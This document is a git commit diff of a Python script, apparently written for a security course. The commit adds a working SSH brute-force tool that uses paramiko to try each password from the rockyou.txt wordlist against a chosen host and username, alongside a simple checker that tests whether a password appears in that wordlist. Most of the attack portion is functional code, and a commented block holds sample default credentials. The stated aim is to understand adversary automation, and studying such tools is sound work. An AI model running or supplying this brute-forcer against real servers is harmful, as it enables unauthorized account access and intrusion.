d272c7ce9cebd146e341ad8caac68fb5516127ee
Zachary Derrick <derrick.zachary@gmail.com>
2022-10-26 23:55:46 +0000

    Working SSH Brute Force Tool w/ Password Strength Tester

--- automatebruteforcewordlistattacktooltpt.2.py
+++ automatebruteforcewordlistattacktooltpt.2.py
@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
-# Script: Ops 401 Class 16 Automated Brute Force Wordlist Attack Tool Part 1 of 3
+# Script: Ops 401 Class 16 Automated Brute Force Wordlist Attack Tool Part 2 of 3
 
 # Author: Zachary Derrick                    
-# Date of latest revision:  10/25/22    
+# Date of latest revision:  10/26/22    
 # Purpose: Continuation of a custom tool that performs brute force attacks 
 #          to better understand the types of automation employed by adversaries.
 
 # Import Libraries
 import time, getpass, paramiko, sys, os, socket
-from pexpect import pxssh
 
-global host, username, line, input_file
-
+# for a fun line break
+line = "\n-------------------------------------------------------------( ◣∀◢)ψ------------------\n"
+# this tests the strength of a password              
 def iterator():
     filepath = input("Please enter the filepath to your password dictionary:\n")  or "/home/zaxxon/rockyou.txt"
     file = open(filepath)
@@ -26,10 +26,12 @@ def iterator():
         line = file.readline()
     file.close() 
 
+# function to find and load up a password dictionary, here the default is "rockyou.txt"
 def dictpath():
     passdict = input("Please enter the filepath to your password dictionary:\n") or "/home/zaxxon/rockyou.txt"
     return passdict
 
+# this function asks the user for a password to check against the pw dictionary and allows to text until their heart's content
 def safepassword(pathtodict):
     testpass = input("Enter password to check against password dictionary:\n")
     with open(pathtodict, encoding="latin1") as file:
@@ -40,7 +42,7 @@ def safepassword(pathtodict):
             if retry.lower() == "yes" or retry.lower() == "y":
                 safepassword(pathtodict)
             elif retry.lower() == "no" or retry.lower() == "n":
-                sys.exit("Good, I was done with you anyways. ( ◣∀◢)ψ")
+                sys.exit("Welly, welly, welly, welly, welly, welly, well. ( ◣∀◢)ψ")
         else:
             print("Your word was not found in the atck dictionary.\n")
             continue_to_main_menu = input("Would you like to return to the main menu?")
@@ -50,18 +52,93 @@ def safepassword(pathtodict):
                 sys.exit("Your password is safe with me. ( ◣∀◢)ψ")
             else: 
                 print("Was that a yes or a no?")   
-      
-            
-# iterator()
-# safepassword()   
 
-# sample of SSH authentication
+# this code was pieced together from: https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
+# however, the code in that link was written in Python 2, so it's been adapted to Py3 and also put into a working function   
+def Brute_Force_Prompt():
+    try:
+        global host, username, input_file
+        host = input("[电脑主机] Enter Host to B.F.: ") or "10.0.0.181"
+        username = input("[名] Enter SSH Username: ") or "zaxxon"
+        input_file = input("[密码列表文件] Enter SSH Password File: ") or "/home/zaxxon/rockyou.txt"
+
+        if os.path.exists(input_file) == False:
+            print("\n[注意] File Path Does Not Exist. ( ◣∀◢)ψ ")
+            sys.exit(4)
+    except KeyboardInterrupt:
+        print("\n\n[止] User Requested An Interrupt")
+        sys.exit(3) 
+
+    input_file = open(input_file, encoding="latin1")
+    print("")
+    for i in input_file.readlines():
+        password = i.strip("\n")
+        try:
+            response = ssh_connect(password)
+            if response == 0:
+                print("%s[名] User: %s [密码] Password Found: %s%s" % (line, username, password, line,))
+                main_menu()
+            elif response == 1:
+                print("[名] User: %s [密码] Password: %s => Login Incorrect <=" % (username, password,))
+            elif response == 2:
+                print("[注意] Conection Could Not Be Established To Address: %s" % (host,))
+        except Exception as e:
+            print(e.message)
+            pass
+    input_file.close()
+
+def ssh_connect(password, code = 0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+    except paramiko.AuthenticationException:
+        code = 1
+    except OSError as e:
+        code = 2
+    ssh.close()
+    return code 
+
+def main_menu():
+    choice ='0'
+    print("\n⛧::::::Pa$$w0rd ☠️H҉A҉C҉K҉E҉R҉☠️::( ◣∀◢)ψ ⛧")
+    print("Choose 1 to Check Password Strength Against Common Password List")
+    print("Choose 2 to Brute Force SSH")
+    # print("Choose 3 to ")
+    # print("Choose 4 to ")
+    # print("Choose 5 to ")
+    # print("Choose 6 to ")
+    print("Choose 0 to Quit Program")
+    choice = input("What's it going to be then, eh?: ")
+    if choice == "1":
+        safepassword(dictpath())   
+    elif choice == "2":
+        Brute_Force_Prompt()
+    # elif choice == "3":
+    #     
+    # elif choice == "4":
+    #   
+    # elif choice == "5":
+    # 
+    # elif choice == "6":
+    #    
+    elif choice == "0":
+        sys.exit("\nNaughty, Naughty, Naughty you sneaky ol' ha☠or!")
+    else:
+        print("\nThat is not an option.")
+
+while True:
+    main_menu()
 
 
-# session = pxssh.pxssh()
-# host = input("Please provde an IP address: ") or "10.0.0.81"
-# username = input("Please provide a username: ") or "splunkadmin"
-# passwrd = getpass.getpass(prompt = "Enter a password: ") or "splunkadmin"
+
+ 
+
+   
+
+
+
+
 
 
 # try:
@@ -81,42 +158,13 @@ def safepassword(pathtodict):
 #     print("pxssh failed on login.")
 #     print(e)
 
-def main_menu():
-    choice ='0'
-    print("\n::::::::Pa$$w0rd ☠️H҉A҉C҉K҉E҉R҉☠️::::::::")
-    print("Choose 1 to Check Password Strength Against Common Password List")
-    # print("Choose 2 to Decrypt a File")
-    # print("Choose 3 to Encrypt a Message")
-    # print("Choose 4 to Decrypt a Message")
-    # print("Choose 5 to Encrypt a Folder")
-    # print("Choose 6 to Decrypt a Folder")
-    print("Choose 0 to Quit Program")
-    choice = input("Please make a choice: ")
-    if choice == "1":
-        safepassword(dictpath())   
-    # elif choice == "2":
-    #     file_path = input("\nEnter the file path of the file to decrypt: ")
-    #     decrypt_file(file_path, key)
-    # elif choice == "3":
-    #     message = input("\nInput message to encrypt: ")
-    #     output = encrypt_message(message, key)
-    #     print("\nCiphertext is: " + output)
-    # elif choice == "4":
-    #     message = input("\nInput message to decrypt: ")
-    #     output = decrypt_message(message, key)
-    #     print("\nDecrypted message is: " + output)
-    # elif choice == "5":
-    #     dir_path = input("\nEnter the directory to be encrypted: ")
-    #     encrypt_dir(dir_path, key)
-    # elif choice == "6":
-    #     dir_path = input("Path to be Decrypted: ")
-    #     decrypt_dir(dir_path, key)
-    elif choice == "0":
-        sys.exit("\nIf you want to keep a secret, you must also hide it from yourself.")
-    else:
-        print("\nThat is not an option.")
+# iterator()
+# safepassword()   
+
+# sample of SSH authentication
 
 
-while True:
-    main_menu()
-# 10.0.0.81/24
+# session = pxssh.pxssh()
+# host = input("Please provde an IP address: ") or "10.0.0.81"
+# username = input("Please provide a username: ") or "splunkadmin"
+# passwrd = getpass.getpass(prompt = "Enter a password: ") or "splunkadmin"
